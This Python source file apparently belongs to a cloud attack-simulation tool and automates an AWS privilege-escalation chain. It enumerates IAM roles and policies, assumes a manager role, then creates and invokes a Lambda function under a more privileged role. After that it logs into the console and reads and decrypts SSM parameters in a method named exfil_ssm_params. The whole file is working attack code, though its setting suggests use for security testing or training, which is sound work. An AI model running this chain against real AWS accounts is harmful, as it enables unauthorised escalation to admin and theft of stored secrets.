 
import os
from lib.iam_enum import IAMEnum
from lib.iam_operations import assume_role, console_login, create_client_with_credentials
from lib.instance_repo import add_to_disk
import time
import zipfile
import boto3
import tempfile

file_path = './api/lambda_privesc/lambda_function.py'
zip_file_path = './api/lambda_privesc/lambda_function.py.zip'

iam_policy = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "sean",
            "Effect": "Allow",
            "Action": [
                "sts:AssumeRole",
                "iam:List*",
                "iam:Get*"
            ],
            "Resource": "*"
        }
    ]
}

class AttackLambdaPriEsc:
    def __init__(self, id, aws_region, instance, pathToDisk):
        self.id = id
        self.user_name = instance["resources"][1]["user"]
        self.user_access_key = instance["resources"][2]["accessKeyId"]
        self.user_secret_key = instance["resources"][2]["secretAccessKey"]
        self.ssm_params = instance["resourcesV2"]['ssm_params']
        self.instance = instance
        self.status = None
        self.step = 0
        self.filename=os.path.abspath(f"{pathToDisk}/{self.id}.json")
        self.aws_region = aws_region

    def attack(self):
        self.status = 'attack_started'
        try:
            self.step = 1
            iam_enum = IAMEnum(self.user_name,self.user_access_key, self.user_secret_key,self.aws_region)
            self.instance["logs"].append(f"User {self.user_name} enumerated IAM permissions.")
            self._add_to_disk()
            
            self.step = 2
            iam_enum.noise_enum(self.instance["exchange"], self.instance["logs"])
            self._add_to_disk()
            
            debug_role = self.instance['resources'][5]['role']
            iam_enum.iam_role_enum(debug_role,self.instance["exchange"], self.instance["logs"])
            self._add_to_disk()

            self.step = 3
            manager_role = self.instance['resources'][4]['role']
            iam_enum.iam_role_enum(manager_role, self.instance["exchange"], self.instance["logs"])
            self._add_to_disk()

            debug_role_arn = self.instance['resources'][5]['arn']['Arn']
            manager_role_policy_arn = self.instance['resources'][3]['arn']
            manager_role_arn = self.instance['resources'][4]['arn']['Arn']
            iam_enum.get_iam_policy(manager_role_policy_arn, self.instance["exchange"], self.instance["logs"])
            self._add_to_disk()
            time.sleep(15)
            
            self.step = 4
            sts_response = assume_role(self.user_access_key, self.user_secret_key, manager_role_arn, manager_role, self.instance["exchange"], self.instance["logs"])
            _replace_string_in_file_and_zip(self.user_name)
            self._create_function_and_invoke(self.id, sts_response,debug_role_arn, self.instance['exchange'], self.instance['logs'], self.instance['resources'])
            self._add_to_disk()

            self.step = 5
            iam_enum.list_attached_user_policies(self.user_name, self.instance['exchange'], self.instance['logs'])
            self._add_to_disk()
            time.sleep(10)

            self.step = 6
            console_login(self.user_name, self.user_access_key, self.user_secret_key,self.instance['exchange'], self.instance['logs'])
            self._add_to_disk()

            self.step = 7
            self.exfil_ssm_params()
            self.status = 'attack_complete'
            self._add_to_disk()
        except Exception as e:
            self.status = 'attack_failed'
            self.instance["logs"].append(f"Attack failed: {e}")
            print(f"Attack failed: {e}")
            self._add_to_disk()
       
    def exfil_ssm_params(self):
        client = create_client_with_credentials('ssm', self.aws_region,  self.user_access_key, self.user_secret_key)

        response = client.describe_parameters()
        self.instance["exchange"].append({"operation": "describe_parameters", "response": response})

        for param in self.ssm_params:
            response = client.get_parameter(
                Name=param,
                WithDecryption=True  
            )
            self.instance["exchange"].append({"operation": "get_parameters", "response": response})
        
        self.instance["logs"].append("Downloaded SSM parameters")
    
    def _create_function_and_invoke(self, id, sts_creds, lambda_role_arn, exchange, logs, resources):
        lambda_client = boto3.client(
            'lambda',
            aws_access_key_id=sts_creds['AccessKeyId'],
            aws_secret_access_key=sts_creds['SecretAccessKey'],
            aws_session_token=sts_creds['SessionToken'],
            region_name=self.aws_region,
        )

        role_arn = lambda_role_arn
        file_path = './api/lambda_privesc/lambda_function.py.zip'

        with open(file_path, 'rb') as zip_file:
            zip_content = zip_file.read()

        function_name = f"admin_function-{id}"

        response = lambda_client.create_function(
            FunctionName=function_name,
            Runtime='python3.9',
            Role=role_arn,
            Handler='lambda_function.lambda_handler',
            Code={'ZipFile': zip_content},
        )
        logs.append(f"Lambda function created: {function_name}")
        exchange.append(f"Lambda function created: {response}")
        resources.append({"function":function_name})
        
        time.sleep(10)
        response = lambda_client.invoke(
        FunctionName=function_name,)

        with open('out.txt', 'wb') as f:
            f.write(response['Payload'].read())

    def _add_to_disk(self):
        add_to_disk(self.filename, self.id,self.status,self.step,self.instance["exchange"],self.instance["logs"],self.instance["resources"], self.instance["resourcesV2"])

def _replace_string_in_file_and_zip( new_string):
    # Temporary file creation to avoid direct modification
    temp_dir = tempfile.mkdtemp()
    temp_file_path = os.path.join(temp_dir, os.path.basename(file_path))

    try:
        # Read the original file content and replace the specified string
        with open(file_path, 'r', encoding='utf-8') as file:
            file_contents = file.read()
        modified_contents = file_contents.replace('user_name', new_string)
        
        # Write the modified contents to the temporary file
        with open(temp_file_path, 'w', encoding='utf-8') as temp_file:
            temp_file.write(modified_contents)
        
        # Create a zip file containing the modified file
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(temp_file_path, arcname=os.path.basename(file_path))
        
        print(f"Modified content has been zipped as '{zip_file_path}'.")
    finally:
        # Cleanup: Remove the temporary directory and its contents
        os.remove(temp_file_path)
        os.rmdir(temp_dir)
 










